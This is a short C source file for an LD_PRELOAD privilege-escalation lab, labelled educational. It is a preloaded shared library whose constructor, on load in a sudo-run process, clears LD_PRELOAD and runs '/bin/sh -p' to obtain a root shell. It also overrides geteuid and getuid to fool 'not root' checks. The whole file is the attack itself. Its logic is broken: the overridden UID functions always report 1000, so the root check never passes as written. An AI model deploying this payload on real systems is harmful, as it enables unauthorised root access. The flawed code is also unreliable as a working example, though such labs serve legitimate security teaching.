/*
 * malicious.c — Shared library for LD_PRELOAD privesc lab (educational only)
 *
 * Constructor runs when the library is loaded into a sudo-invoked process.
 * Spawns a root shell if effective UID is 0.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

/* Override geteuid so programs that check "not root" may proceed */
uid_t geteuid(void) {
    return getuid();
}

uid_t getuid(void) {
    return 1000; /* fake unprivileged UID for naive checks */
}

/* Runs before main() in the loaded program */
__attribute__((constructor))
static void preload_init(void) {
    if (geteuid() == 0 || getuid() == 0) {
        unsetenv("LD_PRELOAD");
        system("/bin/sh -p");
        exit(0);
    }
}
